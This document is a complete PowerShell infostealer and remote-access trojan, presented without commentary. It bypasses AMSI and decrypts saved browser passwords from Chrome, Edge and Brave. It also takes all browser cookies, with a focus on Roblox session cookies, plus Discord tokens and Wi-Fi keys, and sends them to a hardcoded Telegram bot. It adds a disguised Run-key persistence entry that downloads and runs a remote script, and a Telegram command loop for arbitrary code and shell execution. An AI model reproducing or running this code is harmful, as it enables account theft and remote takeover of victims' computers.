$a=[Ref].Assembly.GetType('Sys*.Man*.Aut*.Amsi*');if($a){$b=$a.GetField('amsiInitFailed','N,P,S');if($b){$b.SetValue($null,$true)}}
$tgToken = "8827121220:AAHL7S675bKJdGcFlUULSUlNWOgGPfSla4U"
$tgChat = "-1003960241194"
$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\WindowsUpdate"
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$tgBase = "https://api.telegram.org/bot$tgToken"
$lt = [char]0x3C; $gt = [char]0x3E
function ts($m, $rid=$null) {
  $t = "${lt}b${gt}${m}${lt}/b${gt}"
  $body = @{chat_id=$tgChat;text=$t;parse_mode="HTML";disable_web_page_preview=$true}
  if ($rid) { $body.reply_to_message_id = $rid }
  $j = $body | ConvertTo-Json
  for ($i = 0; $i -lt 3; $i++) {
    try { Invoke-RestMethod -Uri "$tgBase/sendMessage" -Method Post -Body $j -ContentType "application/json" -TimeoutSec 15 -ErrorAction Stop | Out-Null; break }
    catch { if ($i -ge 2) { break }; Start-Sleep -Seconds 2 }
  }
}
$R = "[+]"; $PC = "[i]"; $LK = "[k]"; $KY = "[k]"; $GL = "[w]"
$RB = "[g]"; $GM = "[d]"; $WF = "[n]"; $CK = "[v]"; $XX = "[x]"
$WA = "[!]"
try {
  $ip = try { (Invoke-WebRequest -Uri "https://api.ipify.org" -TimeoutSec 10 -UseBasicParsing).Content } catch { try { (New-Object Net.WebClient).DownloadString("https://api.ipify.org") } catch { "Unknown" } }
  $os = try { (Get-WmiObject Win32_OperatingSystem).Caption } catch { try { (Get-CimInstance Win32_OperatingSystem).Caption } catch { "Unknown" } }
  $cpu = try { (Get-WmiObject Win32_Processor).Name } catch { "Unknown" }
  $ram = try { [math]::Round((Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory / 1GB, 0) } catch { 0 }
  $user = $env:USERNAME; $comp = $env:COMPUTERNAME; $dom = $env:USERDOMAIN
  $sysInfo = "IP: $ip | User: $user@$comp ($dom)`nOS: $os | CPU: $cpu | RAM: ${ram}GB"
} catch { $sysInfo = "System info error: $_" }
try {
  Add-Type @"
using System; using System.Runtime.InteropServices; using System.Text;
public class N {
[DllImport("crypt32.dll")] public static extern bool CryptUnprotectData(ref D pIn, IntPtr a, IntPtr b, IntPtr c, IntPtr d, uint f, ref D pOut);
[DllImport("kernel32.dll")] public static extern IntPtr LocalFree(IntPtr h);
[DllImport("bcrypt.dll", EntryPoint="BCryptOpenAlgorithmProvider")] public static extern int BOpen(out IntPtr h, string a, string b, uint f);
[DllImport("bcrypt.dll", EntryPoint="BCryptCloseAlgorithmProvider")] public static extern int BClose(IntPtr h, uint f);
[DllImport("bcrypt.dll", EntryPoint="BCryptSetProperty")] public static extern int BSetP(IntPtr h, string p, byte[] v, uint l, uint f);
[DllImport("bcrypt.dll", EntryPoint="BCryptGenerateSymmetricKey")] public static extern int BGenKey(IntPtr ha, out IntPtr hk, byte[] ko, uint kol, byte[] s, uint sl, uint f);
[DllImport("bcrypt.dll", EntryPoint="BCryptDestroyKey")] public static extern int BDesKey(IntPtr h);
[DllImport("bcrypt.dll", EntryPoint="BCryptDecrypt")] public static extern int BDec(IntPtr hk, byte[] inp, uint il, ref A ai, byte[] iv, uint ivl, byte[] op, uint ol, out uint rl, uint f);
[DllImport("bcrypt.dll", EntryPoint="BCryptGetProperty")] public static extern int BGetP(IntPtr h, string p, byte[] o, uint ol, out uint rl, uint f);
[DllImport("winsqlite3.dll")] public static extern int sqlite3_open_v2(string f, out IntPtr d, int fl, IntPtr z);
[DllImport("winsqlite3.dll")] public static extern int sqlite3_close(IntPtr d);
[DllImport("winsqlite3.dll")] public static extern int sqlite3_prepare_v2(IntPtr d, string sql, int n, out IntPtr s, IntPtr t);
[DllImport("winsqlite3.dll")] public static extern int sqlite3_step(IntPtr s);
[DllImport("winsqlite3.dll")] public static extern int sqlite3_finalize(IntPtr s);
[DllImport("winsqlite3.dll")] public static extern IntPtr sqlite3_column_blob(IntPtr s, int c);
[DllImport("winsqlite3.dll")] public static extern int sqlite3_column_bytes(IntPtr s, int c);
[DllImport("winsqlite3.dll", CharSet=CharSet.Ansi)] public static extern IntPtr sqlite3_column_text(IntPtr s, int c);
public struct D { public uint l; public IntPtr p; }
public struct A { public uint s; public uint v; public IntPtr n; public uint nl; public IntPtr ad; public uint adl; public IntPtr tg; public uint tl; public IntPtr mc; public uint mcl; public uint f; public IntPtr r; public uint rl; }
public static byte[] DPD(byte[] d) {
D i=new D{l=(uint)d.Length,p=Marshal.AllocHGlobal(d.Length)}; Marshal.Copy(d,0,i.p,d.Length);
D o=new D(); bool ok=CryptUnprotectData(ref i,IntPtr.Zero,IntPtr.Zero,IntPtr.Zero,IntPtr.Zero,1,ref o);
Marshal.FreeHGlobal(i.p); if(!ok)return null;
byte[] r=new byte[o.l]; Marshal.Copy(o.p,r,0,(int)o.l); LocalFree(o.p); return r; }
public static byte[] AG(byte[] k, byte[] n, byte[] c, byte[] t) {
IntPtr ha; int ret=BOpen(out ha,"AES",null,0); if(ret!=0)return null;
byte[] g=Encoding.ASCII.GetBytes("GCM\0"); BSetP(ha,"ChainingMode",g,4,0);
byte[] ob=new byte[4]; uint ol=0; BGetP(ha,"ObjectLength",ob,4,out ol,0);
byte[] ko=new byte[ol]; IntPtr hk;
ret=BGenKey(ha,out hk,ko,ol,k,(uint)k.Length,0); if(ret!=0){BClose(ha,0);return null;}
A ai=new A(); ai.s=(uint)Marshal.SizeOf(typeof(A)); ai.v=1;
IntPtr np=Marshal.AllocHGlobal(n.Length); Marshal.Copy(n,0,np,n.Length); ai.n=np; ai.nl=(uint)n.Length;
IntPtr tp=Marshal.AllocHGlobal(t.Length); Marshal.Copy(t,0,tp,t.Length); ai.tg=tp; ai.tl=(uint)t.Length;
byte[] op=new byte[c.Length]; uint rl=0;
ret=BDec(hk,c,(uint)c.Length,ref ai,null,0,op,(uint)op.Length,out rl,0);
Marshal.FreeHGlobal(np); Marshal.FreeHGlobal(tp); BDesKey(hk); BClose(ha,0);
if(ret!=0)return null; Array.Resize(ref op,(int)rl); return op; } }
"@
} catch { ts "$WA Crypto module failed: $_"; exit }
function copyDb($dbPath) {
  $tmp = "$env:TEMP\db_$([System.IO.Path]::GetRandomFileName()).db"
  $fs = [System.IO.File]::Open($dbPath, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::ReadWrite)
  $ms = New-Object System.IO.MemoryStream; $fs.CopyTo($ms); $fs.Close()
  [System.IO.File]::WriteAllBytes($tmp, $ms.ToArray()); $ms.Close()
  return $tmp
}
function openDb($dbPath) {
  try { $tmp = copyDb $dbPath; $ptr = [IntPtr]::Zero; if ([N]::sqlite3_open_v2($tmp, [ref]$ptr, 1, [IntPtr]::Zero) -eq 0) { return @{ptr=$ptr;tmp=$tmp} }; Remove-Item $tmp -Force -ErrorAction SilentlyContinue } catch {}
  return $null
}
$chromeKey = $null
try {
  $lsPath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"
  if (Test-Path $lsPath) {
    $encKey = (Get-Content $lsPath -Raw | ConvertFrom-Json).os_crypt.encrypted_key
    if ($encKey) { $chromeKey = [N]::DPD([Convert]::FromBase64String($encKey)[5..999]) }
  }
} catch {}
function Steal-Passwords {
  $all = @(); $br = @()
  $bl = @(@("Chrome","$env:LOCALAPPDATA\Google\Chrome\User Data"),@("Edge","$env:LOCALAPPDATA\Microsoft\Edge\User Data"),@("Brave","$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data"))
  foreach ($b in $bl) {
    $bn=$b[0]; $bp=$b[1]; if(!(Test-Path $bp)){$br+="$GL ${bn}:`n$XX Not installed";continue}
    $profs=@("Default"); try{Get-ChildItem "$bp\Profile *" -Dir -EA 0|%{$profs+=$_.Name}}catch{}
    $pw=0; $hist=0
    foreach ($pf in $profs) {
      $ld="$bp\$pf\Login Data"; $hd="$bp\$pf\History"
      if (Test-Path $ld) {
        try { $db=openDb $ld; if($db){$ptr=$db.ptr;$s=[IntPtr]::Zero
          if([N]::sqlite3_prepare_v2($ptr,"SELECT origin_url,username_value,password_value FROM logins",-1,[ref]$s,[IntPtr]::Zero)-eq0){
            while([N]::sqlite3_step($s)-eq100){$u=[N]::sqlite3_column_text($s,0);$us=[N]::sqlite3_column_text($s,1)
              $el=[N]::sqlite3_column_bytes($s,2);$ep=[N]::sqlite3_column_blob($s,2)
              if($el-gt15-and$ep-ne[IntPtr]::Zero-and$chromeKey){
                $e=New-Object byte[] $el;[Runtime.InteropServices.Marshal]::Copy($ep,$e,0,$el)
                $n=$e[3..14];$cl=$el-31;if($cl-gt0){$ct=$e[15..(14+$cl)];$t=$e[(15+$cl)..($el-1)]
                  $d=[N]::AG($chromeKey,$n,$ct,$t);if($d-ne$null){$pw++
                    $l=if($u-ne[IntPtr]::Zero){[Runtime.InteropServices.Marshal]::PtrToStringAnsi($u)}else{""}
                    $un=if($us-ne[IntPtr]::Zero){[Runtime.InteropServices.Marshal]::PtrToStringAnsi($us)}else{""}
                    $all+=@{url=$l;username=$un;password=[Text.Encoding]::UTF8.GetString($d);browser=$bn}}}}}
          [N]::sqlite3_finalize($s)}[N]::sqlite3_close($ptr);Remove-Item $db.tmp -Force -EA 0}catch{}
      }
      if (Test-Path $hd) {
        try { $db=openDb $hd; if($db){$ptr=$db.ptr;$s=[IntPtr]::Zero
          if([N]::sqlite3_prepare_v2($ptr,"SELECT COUNT(*) FROM urls",-1,[ref]$s,[IntPtr]::Zero)-eq0){
            if([N]::sqlite3_step($s)-eq100){$c=[N]::sqlite3_column_text($s,0);if($c-ne[IntPtr]::Zero){$hist+=[int][Runtime.InteropServices.Marshal]::PtrToStringAnsi($c)}}}
          [N]::sqlite3_finalize($s);[N]::sqlite3_close($ptr);Remove-Item $db.tmp -Force -EA 0}catch{}
      }
    }
    $br+="$GL ${bn}:`n$CK $pw pw, $hist hist"
  }
  return @{report=($br-join"`n");passwords=$all}
}
function Steal-CookiesCDP {
  $ckCount=0;$rob=$null;$allCk=@()
  try {
    $cex=@("$env:LOCALAPPDATA\Google\Chrome\Application\chrome.exe","${env:ProgramFiles}\Google\Chrome\Application\chrome.exe")|?{Test-Path $_}|select -First 1
    if(-not$cex){$cex=@("$env:LOCALAPPDATA\Microsoft\Edge\Application\msedge.exe","${env:ProgramFiles}\Microsoft\Edge\Application\msedge.exe")|?{Test-Path $_}|select -First 1}
    if(-not$cex){$cex=@("$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\Application\brave.exe","${env:ProgramFiles}\BraveSoftware\Brave-Browser\Application\brave.exe")|?{Test-Path $_}|select -First 1}
    if($cex){gp chrome,msedge,brave -EA 0|Stop-Process -Force;sleep 2
      $port=9222;try{while((Get-NetTCPConnection -LocalPort $port -EA 0)-and$port-lt9232){$port++}}catch{}
      $p=Start-Process -FilePath $cex -ArgumentList "--remote-debugging-port=$port --no-first-run --no-default-browser-check --disable-gpu --headless=new --disable-session-crashed-bubble" -PassThru -WindowStyle Hidden
      sleep 4
      $wsUrl=try{$t=Invoke-RestMethod "http://127.0.0.1:$port/json" -TimeoutSec 5 -EA Stop;if($t[0].webSocketDebuggerUrl){$t[0].webSocketDebuggerUrl}else{(Invoke-RestMethod "http://127.0.0.1:$port/json/new?about:blank" -TimeoutSec 5 -EA Stop).webSocketDebuggerUrl}}catch{$null}
      if($wsUrl){$ws=New-Object System.Net.WebSockets.ClientWebSocket
        $ws.ConnectAsync((New-Object Uri($wsUrl)),([Threading.CancellationToken]::None)).GetAwaiter().GetResult()
        $cmd=@{id=1;method="Network.getAllCookies"}|ConvertTo-Json -Compress
        $b=[Text.Encoding]::UTF8.GetBytes($cmd)
        $ws.SendAsync((New-Object ArraySegment[byte] -ArgumentList @(,$b)),([Net.WebSockets.WebSocketMessageType]::Text),$true,([Threading.CancellationToken]::None)).GetAwaiter().GetResult()
        $rb=New-Object byte[] 1048576;$list=New-Object Collections.Generic.List[byte]
        do{$r=$ws.ReceiveAsync((New-Object ArraySegment[byte] -ArgumentList @(,$rb)),([Threading.CancellationToken]::None)).GetAwaiter().GetResult();if($r.Count-gt0){$list.AddRange([byte[]]($rb[0..($r.Count-1)]))}}while(!$r.EndOfMessage)
        $ws.Dispose()
        $resp=[Text.Encoding]::UTF8.GetString($list.ToArray())|ConvertFrom-Json
        if($resp.result-and$resp.result.cookies-and$resp.id-eq1){$ckCount=$resp.result.cookies.Count
          foreach($cc in $resp.result.cookies){$allCk+=$cc;if(($cc.name-eq".ROBLOSECURITY"-or$cc.name-eq"ROBLOSECURITY")-and$cc.domain.Contains("roblox.com")){$rob=$cc.value}}}
        $ws2=New-Object System.Net.WebSockets.ClientWebSocket
        $ws2.ConnectAsync((New-Object Uri($wsUrl)),([Threading.CancellationToken]::None)).GetAwaiter().GetResult()
        $cmd2=@{id=2;method="Network.getCookies";params=@{urls=@("https://roblox.com")}}|ConvertTo-Json -Compress
        $b2=[Text.Encoding]::UTF8.GetBytes($cmd2)
        $ws2.SendAsync((New-Object ArraySegment[byte] -ArgumentList @(,$b2)),([Net.WebSockets.WebSocketMessageType]::Text),$true,([Threading.CancellationToken]::None)).GetAwaiter().GetResult()
        $rb2=New-Object byte[] 262144;$list2=New-Object Collections.Generic.List[byte]
        do{$r2=$ws2.ReceiveAsync((New-Object ArraySegment[byte] -ArgumentList @(,$rb2)),([Threading.CancellationToken]::None)).GetAwaiter().GetResult();if($r2.Count-gt0){$list2.AddRange([byte[]]($rb2[0..($r2.Count-1)]))}}while(!$r2.EndOfMessage)
        $ws2.Dispose()
        $resp2=[Text.Encoding]::UTF8.GetString($list2.ToArray())|ConvertFrom-Json
        if($resp2.result-and$resp2.result.cookies){foreach($cc2 in $resp2.result.cookies){if(($cc2.name-eq".ROBLOSECURITY"-or$cc2.name-eq"ROBLOSECURITY")-and-not$rob){$rob=$cc2.value}}}}
      if($p-and!$p.HasExited){$p.Kill()}}else{ts "$CK CDP:`n$XX No Chromium browser"}
  }catch{}
  return @{count=$ckCount;cookies=$allCk;roblox=$rob}
}
function Steal-Roblox {
  $r=$null
  if($robCookie){$r=$robCookie.Replace("&","&amp;").Replace("<","&lt;").Replace(">","&gt")}
  try{$rk=Get-ItemProperty "HKCU:\Software\Roblox\RobloxMessenger\*" -EA 0;if($rk){$r="Register: $($rk|Out-String)"}}catch{}
  try{$ra="$env:LOCALAPPDATA\Roblox";if(Test-Path $ra){$rf=Get-ChildItem $ra -Include *.log,*.json -Recurse -File -EA 0|?{$_.Length -lt 1MB -and $_.Length -gt 10}
    foreach($f in $rf){$c=Get-Content $f.FullName -Raw -EA 0;if($c-and$c-match'_\|WARNING.*DO-NOT-SHARE'){$r="AppData: $($matches[0])"}}}}catch{}
  $r
}
function Steal-Discord {
  $tokens=@();$dcRegex=[regex]'[MN][A-Za-z0-9_-]{23,28}\.[A-Za-z0-9_-]{6}\.[A-Za-z0-9_-]{27,38}'
  foreach($d in @("$env:APPDATA\discord","$env:APPDATA\discordcanary","$env:APPDATA\discordptb","$env:APPDATA\discorddevelopment")){
    $ldb="$d\Local Storage\leveldb";if(Test-Path $ldb){Get-ChildItem $ldb -Include *.ldb,*.log -Recurse -File -EA 0|%{$c=try{Get-Content $_.FullName -Raw -EA 0}catch{};if($c){$dcRegex.Matches($c)|%{if($tokens-notcontains$_.Value){$tokens+=$_.Value}}}}}}
  $tokens
}
function Steal-WiFi {
  $wl=@();try{$wp=netsh wlan show profiles|Select-String "All User Profile"|%{($_ -split ":")[1].Trim()}
    foreach($s in $wp){$d=netsh wlan show profile name="$s" key=clear;$p=$d|Select-String "Key Content"|%{($_ -split ":")[1].Trim()};$wl+="${s}: ${p}"}}catch{}
  $wl
}
function Install-Persistence {
  try {
    $cmd = "powershell -NoP -NonI -W Hidden -Exec Bypass -C ""IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/kai195102/d/main/c.ps1')"""
    New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsHealthUpdate" -Value $cmd -PropertyType String -Force -EA Stop | Out-Null
    if (!(Test-Path $regPath)) { New-Item -Path $regPath -Force -EA Stop | Out-Null }
    New-ItemProperty -Path $regPath -Name "FirstRun" -Value 1 -PropertyType DWord -Force -EA Stop | Out-Null
    ts "$R Persistence: Run key installed"
  } catch { ts "$WA Persistence failed: $_" }
}
function Remove-Persistence {
  try { Remove-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsHealthUpdate" -Force -EA Stop } catch {}
  try { Remove-ItemProperty $regPath -Name "FirstRun" -Force -EA Stop } catch {}
  try { Remove-ItemProperty $regPath -Name "UpdateId" -Force -EA Stop } catch {}
  ts "$R Persistence removed"
}
function Steal-All {
  ts "$PC System:`n$sysInfo"
  $pr = Steal-Passwords
  ts $pr.report
  $ckr = Steal-CookiesCDP
  ts "$CK CDP cookies: $($ckr.count)"
  $rob = Steal-Roblox
  if ($rob) { ts "$RB Roblox:`n$CK $rob" } else { ts "$RB Roblox:`n$XX Not found" }
  $dc = Steal-Discord
  if ($dc.Count -gt 0) { ts "$GM Discord ($($dc.Count)):`n$($dc -join "`n")" } else { ts "$GM Discord:`n$XX Not found" }
  $wf = Steal-WiFi
  if ($wf.Count -gt 0) { ts "$WF WiFi ($($wf.Count)):`n$($wf -join ' | ')" } else { ts "$WF WiFi:`n$XX None" }
  ts "$CK Steal complete"
}
function Get-Offset {
  try { $v = (Get-ItemProperty $regPath -Name "UpdateId" -EA Stop).UpdateId; return $v } catch { return 0 }
}
function Set-Offset($id) {
  try { if (!(Test-Path $regPath)) { New-Item -Path $regPath -Force -EA Stop | Out-Null }; New-ItemProperty -Path $regPath -Name "UpdateId" -Value $id -PropertyType QWord -Force -EA Stop | Out-Null } catch {}
}
function Cmd-Exec($msgId, $code) {
  $result = try { $r = Invoke-Expression $code 2>&1; if (-not $r) { "[ok]" } else { $r | Out-String } } catch { "$($_.Exception)" }
  ts $result $msgId
}
function Cmd-Shell($msgId, $cmd) {
  $result = try { $r = cmd /c $cmd 2>&1; if (-not $r) { "[ok]" } else { $r | Out-String } } catch { "$($_.Exception)" }
  ts $result $msgId
}
function Cmd-Load($msgId, $url) {
  try { IEX (New-Object Net.WebClient).DownloadString($url); ts "Module loaded" $msgId } catch { ts "Load failed: $($_.Exception)" $msgId }
}
function Cmd-Sleep($msgId, $sec) {
  $script:pollInterval = [math]::Max(5, $sec)
  ts "Interval set to ${script:pollInterval}s" $msgId
}
$pollInterval = 60
function C2-Loop {
  $errCount = 0
  while ($true) {
    try {
      $offset = Get-Offset
      $updates = Invoke-RestMethod -Uri "$tgBase/getUpdates?offset=$offset&timeout=30" -TimeoutSec 35 -EA Stop
      if ($updates.ok -and $updates.result) {
        $errCount = 0
        foreach ($u in $updates.result) {
          $newId = $u.update_id + 1
          Set-Offset $newId
          $msg = $u.message
          if (-not $msg -or $msg.chat.id.ToString() -ne $tgChat) { continue }
          $txt = $msg.text; $rid = $msg.message_id
          if ($txt -eq "/kill") { Remove-Persistence; ts "/kill: Exiting" $rid; exit }
          elseif ($txt -eq "/recon") { Steal-All; ts "/recon done" $rid }
          elseif ($txt -like "/exec *") { Cmd-Exec $rid $txt.Substring(6) }
          elseif ($txt -like "/shell *") { Cmd-Shell $rid $txt.Substring(7) }
          elseif ($txt -like "/load *") { Cmd-Load $rid $txt.Substring(6) }
          elseif ($txt -like "/sleep *") { [int]$sec = $txt.Substring(7); Cmd-Sleep $rid $sec }
          elseif ($txt -eq "/persist") { Install-Persistence; ts "/persist done" $rid }
          elseif ($txt -eq "/help") { ts "Commands: /exec PS_CODE | /shell CMD | /load URL | /recon | /sleep N | /persist | /kill" $rid }
        }
      }
    } catch { $errCount++; if ($errCount -ge 5) { Start-Sleep -Seconds 60; $errCount = 0 } }
    Start-Sleep -Seconds $pollInterval
  }
}
# Main entry
$isFirstRun = try { (Get-ItemProperty $regPath -Name "FirstRun" -EA Stop).FirstRun -eq 1 } catch { $false }
if (-not $isFirstRun) {
  ts "$R C2 first run"
  Steal-All
  Install-Persistence
  ts "$R C2 loop starting — poll interval ${pollInterval}s"
} else {
  # Second run (from persistence) — just enter C2
}
C2-Loop